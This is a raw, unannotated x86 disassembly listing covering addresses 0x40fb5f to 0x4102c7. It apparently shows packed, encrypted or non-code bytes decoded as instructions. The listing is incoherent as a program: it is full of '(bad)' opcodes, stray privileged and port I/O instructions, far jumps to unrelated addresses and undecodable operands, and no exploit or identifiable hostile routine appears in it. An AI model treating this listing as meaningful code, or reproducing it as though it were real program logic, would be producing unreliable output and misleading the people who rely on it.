  40fb5f:	pop    esi
  40fb60:	jp     0x40fba2
  40fb62:	mov    dh,0x2
  40fb64:	int    0x26
  40fb66:	and    al,0x83
  40fb68:	push   ecx
  40fb69:	popa   
  40fb6a:	cmp    ah,bl
  40fb6c:	shr    BYTE PTR [edx+0x9],cl
  40fb6f:	add    cl,dh
  40fb71:	cmp    bl,ch
  40fb73:	inc    edx
  40fb74:	pop    esi
  40fb75:	scas   al,BYTE PTR es:[edi]
  40fb76:	mov    dl,0x34
  40fb78:	add    bh,dh
  40fb7a:	inc    esp
  40fb7b:	imul   esp,DWORD PTR [eax+0x61],0xffffff87
  40fb7f:	popa   
  40fb80:	popa   
  40fb81:	push   eax
  40fb82:	mul    dh
  40fb84:	fmul   DWORD PTR [esi+0x570996ee]
  40fb8a:	and    al,0x7b
  40fb8c:	push   ss
  40fb8d:	inc    ecx
  40fb8e:	xchg   ecx,eax
  40fb8f:	jle    0x40fbfa
  40fb91:	adc    eax,0xe38e40df
  40fb96:	out    dx,al
  40fb97:	ss fwait
  40fb99:	adc    edi,DWORD PTR [edx-0x32613fcc]
  40fb9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fba0:	stc    
  40fba1:	mov    ?,ebx
  40fba3:	sti    
  40fba4:	sti    
  40fba5:	loopne 0x40fc1c
  40fba7:	pop    eax
  40fba8:	or     al,0x5e
  40fbaa:	adc    BYTE PTR [edi+0x530aa938],dh
  40fbb0:	arpl   WORD PTR [eax+ecx*8],sp
  40fbb3:	rcl    BYTE PTR [edx-0x1f88ecee],0x60
  40fbba:	and    DWORD PTR cs:[ecx+0x7882bd38],ecx
  40fbc1:	test   DWORD PTR [esi+0x32c74c63],0xc0515b20
  40fbcb:	mov    esp,0xf6c3b8fe
  40fbd0:	add    eax,0x8a294061
  40fbd5:	push   WORD PTR [ebx]
  40fbd8:	idiv   DWORD PTR [edx+0x3b1cf2ee]
  40fbde:	ret    0x2817
  40fbe1:	lods   eax,DWORD PTR ds:[esi]
  40fbe2:	inc    esi
  40fbe3:	mov    al,ds:0xd27f9b00
  40fbe8:	fidiv  WORD PTR [esi+0x1d4e6cfa]
  40fbee:	and    eax,0xdf51975f
  40fbf3:	mov    eax,ds:0x565dc0d5
  40fbf8:	cmp    DWORD PTR [ebp-0x7ee65eec],ebp
  40fbfe:	ret    
  40fbff:	mov    bl,0xfd
  40fc01:	xor    BYTE PTR [eax],al
  40fc03:	or     DWORD PTR [edi+ebx*2],esi
  40fc06:	mul    DWORD PTR [eax+0x2278d0ed]
  40fc0c:	add    edx,DWORD PTR ds:0x56b86b2e
  40fc12:	add    al,BYTE PTR [ebp-0x6f6c07e1]
  40fc18:	push   ds
  40fc19:	mov    eax,ds:0xb0bb96e2
  40fc1e:	mov    esi,DWORD PTR [edx+0x5e]
  40fc21:	add    eax,0xbfc32bc0
  40fc26:	inc    esp
  40fc27:	jo     0x40fbdc
  40fc29:	daa    
  40fc2a:	or     DWORD PTR [ecx-0x1ce76803],esp
  40fc30:	push   ss
  40fc31:	rol    BYTE PTR [ebx],cl
  40fc33:	mov    ecx,0x633f7f5e
  40fc38:	ja     0x40fc03
  40fc3a:	jg     0x40fc70
  40fc3c:	(bad)  
  40fc3d:	pop    ebp
  40fc3e:	jl     0x40fc22
  40fc40:	sbb    esp,esp
  40fc42:	mov    ds:0xfbb46e74,al
  40fc47:	or     dh,cl
  40fc49:	lock out dx,al
  40fc4b:	outs   dx,BYTE PTR ds:[esi]
  40fc4c:	xchg   BYTE PTR [ecx],ah
  40fc4e:	inc    esp
  40fc4f:	mov    ebx,0x7333878a
  40fc54:	adc    al,0x45
  40fc56:	scas   eax,DWORD PTR es:[edi]
  40fc57:	and    cl,al
  40fc59:	ret    0xa187
  40fc5c:	add    eax,0x3e11b598
  40fc61:	cmp    bh,bh
  40fc63:	mov    ebp,0xdc2d9201
  40fc68:	dec    eax
  40fc69:	test   cl,0x66
  40fc6c:	inc    edi
  40fc6d:	loope  0x40fc9d
  40fc6f:	inc    ebp
  40fc70:	or     dl,al
  40fc72:	pop    eax
  40fc73:	adc    DWORD PTR [esi-0x2dd8e0a9],ebp
  40fc79:	leave  
  40fc7a:	mov    esp,0xe3a15ecc
  40fc7f:	sbb    al,0xa2
  40fc81:	xchg   BYTE PTR [bx+di-0x61c4],ah
  40fc86:	adc    BYTE PTR [edx-0x53],ah
  40fc89:	and    DWORD PTR [edx],edx
  40fc8b:	mov    eax,0x6ecbae53
  40fc90:	sahf   
  40fc91:	iret   
  40fc92:	mov    ebp,0x5526051f
  40fc97:	mov    eax,ds:0x5b371fa
  40fc9c:	fist   WORD PTR [edi]
  40fc9e:	fstp   QWORD PTR [ebx+0x345c5e5f]
  40fca4:	shl    BYTE PTR [ecx-0x40d78eb8],cl
  40fcaa:	jmp    0x1f26bb53
  40fcaf:	fidivr WORD PTR [edi-0x7b47eb60]
  40fcb5:	mov    ch,dh
  40fcb7:	xchg   ebp,eax
  40fcb8:	test   al,0xd0
  40fcba:	push   es
  40fcbb:	ret    0xb606
  40fcbe:	mov    fs,WORD PTR [ecx-0xfecd6d0]
  40fcc4:	mov    dl,dl
  40fcc6:	scas   eax,DWORD PTR es:[edi]
  40fcc7:	add    dh,BYTE PTR [esi-0x51ff140d]
  40fccd:	stos   BYTE PTR es:[edi],al
  40fcce:	in     eax,0x27
  40fcd0:	jl     0x40fc57
  40fcd2:	or     DWORD PTR ss:[esi-0x49],esp
  40fcd6:	mov    al,0xf1
  40fcd8:	mov    ds:0x11258d60,eax
  40fcdd:	push   0xffffff9b
  40fcdf:	push   0x53
  40fce1:	scas   eax,DWORD PTR es:[edi]
  40fce2:	out    0xe6,eax
  40fce4:	(bad)  [edi-0x10a15c93]
  40fcea:	mov    ds:0x4e25c2f0,eax
  40fcef:	mov    ds:0xf0b75cd2,al
  40fcf4:	jmp    0x40fcf7
  40fcf6:	push   eax
  40fcf7:	dec    ecx
  40fcf8:	fs fucomip st,st(6)
  40fcfb:	and    BYTE PTR [ebx+0x5b],bl
  40fcfe:	cmp    esi,DWORD PTR [edi]
  40fd00:	enter  0x5725,0xa1
  40fd04:	jbe    0x40fd6b
  40fd06:	dec    esp
  40fd07:	dec    eax
  40fd08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd09:	sbb    ebx,DWORD PTR [edx+eax*4+0x558a505e]
  40fd10:	xchg   edx,eax
  40fd11:	xchg   edx,eax
  40fd12:	loopne 0x40fcca
  40fd14:	xchg   esp,eax
  40fd15:	push   edi
  40fd16:	in     eax,dx
  40fd17:	adc    eax,DWORD PTR [edi]
  40fd19:	test   eax,0x3c6b0aee
  40fd1e:	add    edx,0x5e
  40fd21:	(bad)  
  40fd22:	popf   
  40fd23:	jmp    0x6070:0xe8b2798a
  40fd2a:	ds sub al,0xe1
  40fd2d:	sbb    al,0xc9
  40fd2f:	add    BYTE PTR [ebx+edi*4-0x10],dh
  40fd33:	repz xchg ecx,eax
  40fd35:	xchg   ebx,eax
  40fd36:	cmp    ecx,esp
  40fd38:	jg     0x40fda3
  40fd3a:	sub    ebx,DWORD PTR [ebx]
  40fd3c:	sbb    al,0x61
  40fd3e:	push   esp
  40fd3f:	popa   
  40fd40:	cmc    
  40fd41:	mov    dl,0xeb
  40fd43:	sbb    al,0xda
  40fd45:	(bad)  
  40fd46:	lock movups xmm5,XMMWORD PTR [esi-0x67c11dd7]
  40fd4e:	jo     0x40fd7c
  40fd50:	out    dx,al
  40fd51:	push   edi
  40fd52:	dec    ebx
  40fd53:	mov    ds:0x6d00256d,al
  40fd58:	or     BYTE PTR [eax],ch
  40fd5a:	xchg   edx,eax
  40fd5b:	push   ecx
  40fd5c:	add    eax,0x367bee8b
  40fd61:	icebp  
  40fd62:	out    0xbd,eax
  40fd64:	or     ah,BYTE PTR [ecx-0x50755fcd]
  40fd6a:	xchg   esp,eax
  40fd6b:	sub    DWORD PTR [edi-0x315bf434],ebx
  40fd71:	outs   dx,DWORD PTR ds:[esi]
  40fd72:	nop
  40fd73:	das    
  40fd74:	pop    esi
  40fd75:	xchg   DWORD PTR [edx],edx
  40fd77:	loopne 0x40fd70
  40fd79:	int    0x7f
  40fd7b:	push   edi
  40fd7c:	pusha  
  40fd7d:	pop    esi
  40fd7e:	push   cs
  40fd7f:	pop    ebx
  40fd80:	(bad)  
  40fd82:	mul    al
  40fd84:	fidiv  WORD PTR [eax-0x55]
  40fd87:	lock pop ebp
  40fd89:	xor    eax,0xedfeb635
  40fd8e:	add    ecx,DWORD PTR [ebx+0x110148a2]
  40fd94:	cld    
  40fd95:	pusha  
  40fd96:	mov    edi,0xd81d01dd
  40fd9b:	icebp  
  40fd9c:	inc    edi
  40fd9d:	clc    
  40fd9e:	out    dx,al
  40fd9f:	cli    
  40fda0:	(bad)  [edx+0x6325537]
  40fda6:	int3   
  40fda7:	mov    al,ds:0xdcb88e7c
  40fdac:	test   ecx,ebp
  40fdae:	cs push edi
  40fdb0:	dec    ebx
  40fdb1:	inc    ecx
  40fdb2:	or     eax,0xaf805eba
  40fdb7:	std    
  40fdb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdb9:	stos   BYTE PTR es:[edi],al
  40fdba:	adc    ecx,DWORD PTR [edi-0x5f2448dc]
  40fdc0:	frstor [edx-0x724c463]
  40fdc6:	cs fcomip st,st(0)
  40fdc9:	ds nop
  40fdcb:	(bad)  
  40fdcc:	or     esp,DWORD PTR [ecx-0x48]
  40fdcf:	inc    esp
  40fdd0:	push   ebp
  40fdd1:	daa    
  40fdd2:	mov    ebp,0x268204b3
  40fdd7:	mov    bh,0xa2
  40fdd9:	loopne 0x40fd69
  40fddb:	out    dx,al
  40fddc:	nop
  40fddd:	(bad)  
  40fdde:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fde0:	rcl    BYTE PTR [edi+0x0],cl
  40fde3:	jb     0x40fd8e
  40fde5:	data16 out dx,al
  40fde7:	jns    0x40fdcc
  40fde9:	sub    BYTE PTR [esi],0xb
  40fdec:	dec    esp
  40fded:	inc    esi
  40fdee:	adc    DWORD PTR [eax],0xe046c163
  40fdf4:	hlt    
  40fdf5:	loopne 0x40fe13
  40fdf7:	mov    dh,0x19
  40fdf9:	repz int 0xa3
  40fdfc:	fisttp DWORD PTR [ecx+0x10994e47]
  40fe02:	inc    esi
  40fe03:	enter  0x7f10,0xc6
  40fe07:	pop    ebx
  40fe08:	loopne 0x40fe6a
  40fe0a:	shr    DWORD PTR [ebx],0x39
  40fe0d:	test   DWORD PTR [edx],0x60535208
  40fe13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe14:	mov    WORD PTR [ecx+eiz*8],cs
  40fe17:	mov    al,ds:0xe21dbe44
  40fe1c:	and    al,0x9a
  40fe1e:	loopne 0x40fe28
  40fe20:	arpl   WORD PTR ds:0x5db357ff,dx
  40fe26:	clc    
  40fe27:	shr    BYTE PTR [eax-0x17],1
  40fe2a:	cs cwde 
  40fe2c:	adc    eax,0x16937961
  40fe31:	sbb    DWORD PTR [esi-0x11c0aa8e],edx
  40fe37:	gs cld 
  40fe39:	pop    gs
  40fe3b:	das    
  40fe3c:	mov    esp,0xbbad5b14
  40fe41:	mov    eax,ds:0x37692dee
  40fe46:	clc    
  40fe47:	push   0xffffffde
  40fe49:	shl    eax,cl
  40fe4b:	outs   dx,BYTE PTR ds:[esi]
  40fe4c:	cld    
  40fe4d:	test   al,0xbe
  40fe4f:	arpl   WORD PTR [ebp-0x12b65a3c],ax
  40fe55:	mov    dl,0x58
  40fe57:	mov    eax,ds:0x71b6a223
  40fe5c:	aas    
  40fe5d:	jmp    0x40fe1f
  40fe5f:	scas   al,BYTE PTR es:[edi]
  40fe60:	pop    esi
  40fe61:	popf   
  40fe62:	mov    bh,0xd4
  40fe64:	ds xchg edx,eax
  40fe66:	push   0x34
  40fe68:	fst    DWORD PTR [edx-0x19]
  40fe6b:	jmp    0x8e8f2135
  40fe70:	cmp    DWORD PTR [ebx+esi*2+0x4b7a5e3b],esi
  40fe77:	jge    0x40fe22
  40fe79:	pop    ebx
  40fe7a:	pusha  
  40fe7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe7c:	dec    ebx
  40fe7d:	popa   
  40fe7e:	mov    ebx,0xac8a4595
  40fe83:	xchg   ecx,eax
  40fe84:	ret    0xee85
  40fe87:	das    
  40fe88:	les    eax,FWORD PTR [esi+0x7c2236a4]
  40fe8e:	mul    DWORD PTR [eax+0x450f0ab0]
  40fe94:	dec    edi
  40fe95:	iret   
  40fe96:	xchg   ebp,eax
  40fe97:	jmp    0xe7a701fa
  40fe9c:	sbb    BYTE PTR [ebp+eiz*8-0x569f078d],bh
  40fea3:	cmp    ecx,edx
  40fea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fea6:	cdq    
  40fea7:	pop    ss
  40fea8:	pop    ss
  40fea9:	inc    edx
  40feaa:	data16 (bad) 
  40feac:	lock xchg edi,eax
  40feae:	in     eax,dx
  40feaf:	out    dx,eax
  40feb0:	jae    0x40fe8d
  40feb2:	lahf   
  40feb3:	in     eax,dx
  40feb4:	lea    edi,[edx+esi*1]
  40feb7:	mov    ds:0x5e4b5d77,al
  40febc:	sub    esp,esi
  40febe:	adc    DWORD PTR ds:0x30db9e96,esi
  40fec4:	pop    esi
  40fec5:	lock (bad) 
  40fec7:	rcl    DWORD PTR [ecx],1
  40fec9:	xor    ebx,DWORD PTR [edi]
  40fecb:	jmp    0x40fe60
  40fecd:	dec    edx
  40fece:	inc    ecx
  40fecf:	je     0x40ff22
  40fed1:	popa   
  40fed2:	cs nop
  40fed4:	hlt    
  40fed5:	loope  0x40ff41
  40fed7:	mov    BYTE PTR [esi-0x4e],bl
  40feda:	rol    DWORD PTR [eax+0x48],1
  40fedd:	fcmovb st,st(6)
  40fedf:	xchg   ebx,eax
  40fee0:	(bad)  
  40fee1:	pusha  
  40fee2:	jl     0x40ff4a
  40fee4:	cmp    eax,edx
  40fee6:	dec    ebp
  40fee7:	inc    esp
  40fee8:	sahf   
  40fee9:	imul   dh
  40feeb:	sbb    dl,dl
  40feed:	loop   0x40ff09
  40feef:	in     al,dx
  40fef0:	stc    
  40fef1:	xacquire xchg DWORD PTR [eax+0x556ed2d1],esi
  40fef8:	addr16 pop edx
  40fefa:	sbb    eax,0x2133ffbf
  40feff:	das    
  40ff00:	mov    ds:0xcb75c8e0,al
  40ff05:	sbb    al,BYTE PTR [esi]
  40ff07:	pusha  
  40ff08:	xchg   ebp,eax
  40ff09:	pusha  
  40ff0a:	nop
  40ff0b:	and    al,0xbe
  40ff0d:	and    eax,0x4bbc5ee9
  40ff12:	and    eax,0xa7e0dbb2
  40ff17:	jb     0x40ff82
  40ff19:	sbb    al,0xc7
  40ff1b:	add    esp,esi
  40ff1d:	pusha  
  40ff1e:	mov    edi,0xd36a048e
  40ff23:	mov    dh,0xf6
  40ff25:	test   dh,ch
  40ff27:	fmul   QWORD PTR [ebx]
  40ff29:	out    0x63,al
  40ff2b:	dec    esi
  40ff2c:	pop    ebx
  40ff2d:	jle    0x40fee8
  40ff2f:	mov    al,ds:0x7e839bea
  40ff34:	inc    esp
  40ff35:	fwait
  40ff36:	loopne 0x40ff0b
  40ff38:	pop    esi
  40ff39:	pop    esp
  40ff3a:	ins    DWORD PTR es:[edi],dx
  40ff3b:	jg     0x40ff43
  40ff3d:	mov    esi,0x60708ce3
  40ff42:	fsub   DWORD PTR [eax+0x6f]
  40ff45:	test   eax,esi
  40ff47:	or     ecx,eax
  40ff49:	cdq    
  40ff4a:	out    dx,al
  40ff4b:	mov    dh,0xb2
  40ff4d:	ds xchg edx,eax
  40ff4f:	rol    BYTE PTR [edi+0x31a1d47b],0x11
  40ff56:	jmp    0x40ffc3
  40ff58:	pusha  
  40ff59:	div    DWORD PTR ss:[ecx+eiz*4+0x21]
  40ff5e:	in     eax,dx
  40ff5f:	sub    bl,ch
  40ff61:	mov    eax,ds:0xd7c5da59
  40ff66:	inc    esi
  40ff67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff68:	retf   0x4e60
  40ff6b:	jp     0x40ff8f
  40ff6d:	add    cl,BYTE PTR [edx+0x48917222]
  40ff73:	xor    al,0x53
  40ff75:	scas   eax,DWORD PTR es:[edi]
  40ff76:	imul   edi,DWORD PTR [esi-0x5a41c019],0xffffffb8
  40ff7d:	test   al,0xea
  40ff7f:	push   edi
  40ff80:	popf   
  40ff81:	xchg   esp,eax
  40ff82:	mov    edx,DWORD PTR cs:[eax]
  40ff85:	mov    ch,0xea
  40ff87:	mov    eax,ds:0x8a2f142a
  40ff8c:	ins    DWORD PTR es:[edi],dx
  40ff8d:	push   ss
  40ff8e:	push   0x548ce355
  40ff93:	xor    eax,0x50dd3b5f
  40ff98:	push   edx
  40ff99:	cdq    
  40ff9a:	jle    0x41000b
  40ff9c:	shl    BYTE PTR [eax-0x64],cl
  40ff9f:	fstp   DWORD PTR [ecx+ebp*1-0x3449eb09]
  40ffa6:	out    dx,al
  40ffa7:	scas   al,BYTE PTR es:[edi]
  40ffa8:	cli    
  40ffa9:	dec    esp
  40ffaa:	jecxz  0x40ff31
  40ffac:	cmp    dh,BYTE PTR [ecx+0x6245a161]
  40ffb2:	test   BYTE PTR [edx+0x55],al
  40ffb5:	jg     0x40fff5
  40ffb7:	and    DWORD PTR [esi-0x4c],ebx
  40ffba:	bound  edx,QWORD PTR [ecx]
  40ffbc:	and    eax,0xa622980c
  40ffc1:	pop    ecx
  40ffc2:	jecxz  0x40ff67
  40ffc4:	lahf   
  40ffc5:	sub    ch,ch
  40ffc7:	adc    BYTE PTR [ecx-0x2b],ah
  40ffca:	(bad)  
  40ffcb:	stc    
  40ffcc:	push   eax
  40ffcd:	mov    ch,al
  40ffcf:	push   ebp
  40ffd0:	gs cs mov ch,0x20
  40ffd4:	out    0x95,eax
  40ffd6:	jp     0x40ffd0
  40ffd8:	mov    ds:0xde3fcd61,eax
  40ffdd:	pop    ecx
  40ffde:	sub    BYTE PTR [ebp-0x20915d8b],cl
  40ffe4:	pop    esi
  40ffe5:	fbld   TBYTE PTR [esi-0x69c9039e]
  40ffeb:	icebp  
  40ffec:	in     al,dx
  40ffed:	pusha  
  40ffee:	das    
  40ffef:	outs   dx,BYTE PTR ds:[esi]
  40fff0:	mov    ch,BYTE PTR [ecx]
  40fff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fff3:	push   edx
  40fff4:	jp     0x41001c
  40fff6:	in     eax,dx
  40fff7:	adc    dl,BYTE PTR [eax]
  40fff9:	icebp  
  40fffa:	xor    eax,ecx
  40fffc:	mov    eax,0x513c22ea
  410001:	mov    ah,0xc7
  410003:	pusha  
  410004:	retf   
  410005:	retf   0x8413
  410008:	addr16 (bad) 
  41000a:	out    dx,eax
  41000b:	div    DWORD PTR [edx]
  41000d:	stos   DWORD PTR es:[edi],eax
  41000e:	imul   eax,ecx,0xffffffee
  410011:	dec    esi
  410012:	fcomp  QWORD PTR [esi]
  410014:	aad    0x60
  410016:	sbb    ch,BYTE PTR [ecx]
  410018:	test   BYTE PTR [ecx+0x36],al
  41001b:	cmp    bh,BYTE PTR [esi+0x8]
  41001e:	out    0xaa,eax
  410020:	test   al,0xa0
  410022:	(bad)  
  410023:	pop    ebp
  410024:	scas   al,BYTE PTR es:[edi]
  410025:	call   FWORD PTR [ecx]
  410027:	mov    ds:0x2b7d6128,al
  41002c:	stos   BYTE PTR es:[edi],al
  41002d:	daa    
  41002e:	popa   
  41002f:	cmp    edx,ecx
  410031:	(bad)
  410034:	popf   
  410035:	dec    eax
  410036:	push   esp
  410037:	aas    
  410038:	sub    eax,0xcca131d7
  41003d:	idiv   DWORD PTR [edx+0x10678169]
  410043:	push   0xf503ed5e
  410048:	inc    eax
  410049:	(bad)  
  41004a:	dec    ebp
  41004b:	js     0x4100b3
  41004d:	sub    eax,0xcdc08fbe
  410052:	mov    ch,0xa0
  410054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410055:	sbb    edx,ebp
  410057:	dec    ebx
  410058:	mov    dl,BYTE PTR [ebx-0x43834512]
  41005e:	ficomp WORD PTR [ebx+ebp*8+0x6b]
  410062:	aaa    
  410063:	mov    eax,ds:0x881856e2
  410068:	fnstsw WORD PTR [eax+0x27]
  41006b:	fcomp  QWORD PTR [esi-0x2]
  41006e:	pop    edi
  41006f:	cld    
  410070:	int3   
  410071:	pop    es
  410072:	cmp    eax,DWORD PTR [edi]
  410074:	xor    esp,DWORD PTR [ecx-0x27]
  410077:	sahf   
  410078:	(bad)  
  410079:	jge    0x4100d9
  41007b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41007c:	push   ds
  41007d:	push   ds
  41007e:	out    dx,al
  41007f:	fisubr DWORD PTR [ebx]
  410081:	jge    0x4100a5
  410083:	pop    eax
  410084:	addr16 into 
  410086:	nop
  410087:	mov    ds:0xc28baa7f,al
  41008c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41008d:	jno    0x410106
  41008f:	gs sar al,0xee
  410093:	in     eax,dx
  410094:	mov    bh,0x32
  410096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410097:	or     bh,ch
  410099:	mov    al,ch
  41009b:	mov    ds:0xe5a25a42,eax
  4100a0:	out    0x4b,al
  4100a2:	push   esi
  4100a3:	add    DWORD PTR [edx-0x38],ebx
  4100a6:	in     al,dx
  4100a7:	hlt    
  4100a8:	and    eax,0x4deabffc
  4100ad:	loopne 0x4100df
  4100af:	xchg   ebx,eax
  4100b0:	pop    es
  4100b1:	fs dec edx
  4100b3:	fdiv   DWORD PTR [edx]
  4100b5:	add    eax,0x60f07f38
  4100ba:	dec    eax
  4100bb:	or     ebp,esi
  4100bd:	popf   
  4100be:	mov    al,ds:0xfc3e4528
  4100c3:	popa   
  4100c4:	mov    DWORD PTR [edi],edi
  4100c6:	out    dx,al
  4100c7:	or     al,BYTE PTR [ecx-0x2318b566]
  4100cd:	push   edx
  4100ce:	add    al,0xcf
  4100d0:	lods   eax,DWORD PTR ds:[esi]
  4100d1:	push   es
  4100d2:	shl    BYTE PTR [ebx-0x51349a35],0xe6
  4100d9:	mov    al,ds:0x515e4ce8
  4100de:	xchg   esi,eax
  4100df:	mov    ah,0xc8
  4100e1:	xchg   ecx,eax
  4100e2:	mov    DWORD PTR [eax-0x7b5d9f7c],eax
  4100e8:	outs   dx,DWORD PTR ds:[esi]
  4100e9:	push   ebp
  4100ea:	icebp  
  4100eb:	xchg   ebp,eax
  4100ec:	ss (bad) 
  4100ee:	out    dx,al
  4100ef:	fmul   QWORD PTR [esi]
  4100f1:	push   0xfffffff2
  4100f3:	retf   
  4100f4:	iret   
  4100f5:	iret   
  4100f6:	(bad)  
  4100f7:	mov    al,ds:0x32ef59fb
  4100fc:	or     dl,BYTE PTR [ebx+esi*1+0x232f59be]
  410103:	(bad)  
  410105:	cmp    BYTE PTR [ecx+0x75],ch
  410108:	pop    esi
  410109:	scas   eax,DWORD PTR es:[edi]
  41010a:	cmp    dl,bh
  41010c:	adc    ebx,0xfffffffb
  41010f:	mov    WORD PTR [ebx+0x6e61576e],?
  410115:	sbb    esp,DWORD PTR [ebx+0x17]
  410118:	xchg   BYTE PTR [ecx+0x751da9ef],al
  41011e:	hlt    
  41011f:	mov    esi,0x73bed9ed
  410124:	pop    esi
  410125:	rcr    BYTE PTR [esi],cl
  410127:	imul   esp,eax,0xe9be4160
  41012d:	aam    0x7e
  41012f:	and    DWORD PTR [esi+edx*2-0x331a9212],edx
  410136:	js     0x4100da
  410138:	xor    dl,BYTE PTR ds:0x287aa267
  41013e:	mov    bh,0x4b
  410140:	add    DWORD PTR [bp+0x1],ebx
  410144:	inc    eax
  410145:	ins    DWORD PTR es:[edi],dx
  410146:	out    dx,al
  410147:	and    BYTE PTR [esi+edi*1+0x2c],ch
  41014b:	in     eax,dx
  41014c:	jns    0x410199
  41014e:	fsub   QWORD PTR [eax-0x4ffd6890]
  410154:	mov    eax,ds:0x5210c38d
  410159:	push   ds
  41015a:	push   es
  41015b:	lods   eax,DWORD PTR ds:[esi]
  41015c:	repnz pop esp
  41015e:	leave  
  41015f:	inc    eax
  410160:	es aaa 
  410162:	dec    esi
  410163:	adc    BYTE PTR [esi],0x61
  410166:	ds rol dl,1
  410169:	outs   dx,BYTE PTR ds:[esi]
  41016a:	inc    edx
  41016b:	push   ds
  41016c:	jge    0x410119
  41016e:	out    dx,al
  41016f:	fwait
  410170:	bound  ecx,QWORD PTR [ecx+0x3d]
  410173:	and    BYTE PTR [edi+0x32a0e959],ch
  410179:	or     bh,0xb0
  41017c:	xchg   esp,eax
  41017d:	dec    ebx
  41017e:	pushf  
  41017f:	cmp    eax,0xeaeec6f8
  410184:	adc    al,0x75
  410186:	add    bl,ah
  410188:	push   eax
  410189:	mov    ch,0x55
  41018b:	lahf   
  41018c:	xor    al,cl
  41018e:	jb     0x41016b
  410190:	mov    esi,0xf865b6c2
  410195:	jns    0x410185
  410197:	imul   ebp,edx,0xf02fa63
  41019d:	sbb    bh,bh
  41019f:	mov    al,ds:0x5558de0a
  4101a4:	aad    0x2b
  4101a6:	xor    al,0x2b
  4101a8:	es das 
  4101aa:	pop    eax
  4101ab:	mov    ds:0x46b33548,al
  4101b0:	and    edi,DWORD PTR [edi+0x1e]
  4101b3:	inc    edi
  4101b4:	jne    0x4101dc
  4101b6:	nop
  4101b7:	cmp    DWORD PTR [edx],0xae9e2461
  4101bd:	iret   
  4101be:	xchg   edi,eax
  4101bf:	push   ebp
  4101c0:	and    DWORD PTR [esi+ebx*4+0x2edd389c],esp
  4101c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101c8:	inc    edx
  4101c9:	mov    DWORD PTR [eax],ecx
  4101cb:	dec    edx
  4101cc:	lods   eax,DWORD PTR ds:[esi]
  4101cd:	shl    dl,0x27
  4101d0:	or     eax,0xffffffcc
  4101d3:	mov    al,ds:0xa89a36b0
  4101d8:	jecxz  0x410235
  4101da:	sbb    DWORD PTR [esi],0x5e
  4101dd:	leave  
  4101de:	xchg   ecx,eax
  4101df:	arpl   WORD PTR [edi-0x3e],dx
  4101e2:	imul   edi,DWORD PTR [esi-0x485a9f87],0x4e2f65c2
  4101ec:	push   ebx
  4101ed:	inc    ebx
  4101ee:	out    dx,al
  4101ef:	stc    
  4101f0:	dec    edx
  4101f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101f2:	cmp    DWORD PTR [ecx-0x5e72eb8b],edx
  4101f8:	ins    DWORD PTR es:[edi],dx
  4101f9:	lods   al,BYTE PTR ds:[esi]
  4101fa:	cmp    al,0x74
  4101fc:	jno    0x4101d6
  4101fe:	inc    ecx
  4101ff:	jbe    0x41025f
  410201:	inc    ecx
  410202:	clc    
  410203:	mov    DWORD PTR [esi-0x6a2360e6],ecx
  410209:	pusha  
  41020a:	test   BYTE PTR [esi],0xb7
  41020d:	fstp   TBYTE PTR [esi-0xe]
  410210:	mov    ah,0xa3
  410212:	out    dx,al
  410213:	pop    ss
  410214:	add    BYTE PTR [esi+0x78268549],al
  41021a:	jecxz  0x4101be
  41021c:	gs inc edi
  41021e:	and    edx,DWORD PTR [ecx+0x24]
  410221:	and    ecx,esi
  410223:	xchg   esp,eax
  410224:	push   edi
  410225:	cld    
  410226:	jmp    0x41022e
  410228:	xchg   ebp,eax
  410229:	or     BYTE PTR [esi+0x63],dl
  41022c:	es test eax,0x610d98d4
  410232:	out    0xb0,eax
  410234:	push   0x2191834b
  410239:	sbb    bl,ch
  41023b:	mov    ch,0x5c
  41023d:	mov    bl,0x9
  41023f:	in     al,dx
  410240:	sbb    ecx,edx
  410242:	sbb    eax,0x91610ee1
  410247:	data16 stc 
  410249:	jl     0x410228
  41024b:	nop
  41024c:	ja     0x410210
  41024e:	out    dx,al
  41024f:	data16 jno 0x410212
  410252:	dec    edx
  410253:	or     esi,DWORD PTR [edx-0x615e6f6a]
  410259:	rcl    dl,cl
  41025b:	mov    esp,0xeffb6dfe
  410260:	pop    esi
  410261:	sbb    dl,0xe8
  410264:	inc    eax
  410265:	in     al,dx
  410266:	push   esi
  410267:	cwde   
  410268:	cld    
  410269:	pusha  
  41026a:	das    
  41026b:	sub    al,0x6
  41026d:	sub    BYTE PTR [ecx],0x34
  410270:	adc    BYTE PTR [eax-0x5f172fe2],dl
  410276:	xchg   edi,eax
  410277:	or     edi,0x1caa3a60
  41027d:	popf   
  41027e:	jl     0x4102cc
  410280:	shl    DWORD PTR ds:0xa74e8bed,1
  410286:	mov    cs,WORD PTR [ebx+0x10]
  410289:	cli    
  41028a:	sub    ch,dl
  41028c:	les    esp,FWORD PTR [ebx-0x58]
  41028f:	sbb    esi,ebx
  410291:	data16 stc 
  410293:	adc    al,0xba
  410295:	ja     0x41030d
  410297:	rcr    DWORD PTR [esi-0x31],0xb1
  41029b:	pop    edx
  41029c:	(bad)  
  41029d:	xchg   ebp,eax
  41029e:	scas   eax,DWORD PTR es:[edi]
  41029f:	aad    0xcf
  4102a1:	pusha  
  4102a2:	jmp    FWORD PTR cs:[edi-0x31]
  4102a6:	xchg   esp,eax
  4102a7:	arpl   WORD PTR [ebx-0x6f53fdb4],cx
  4102ad:	jno    0x41025f
  4102af:	iret   
  4102b0:	jmp    0x93fd00b5
  4102b5:	lahf   
  4102b6:	jbe    0x41032d
  4102b8:	cld    
  4102b9:	pusha  
  4102ba:	mov    esp,0x26e12111
  4102bf:	mov    dl,bh
  4102c1:	mov    dl,0xee
  4102c3:	mov    dh,0xa4
  4102c5:	or     al,0x15
  4102c7:	dec    edx
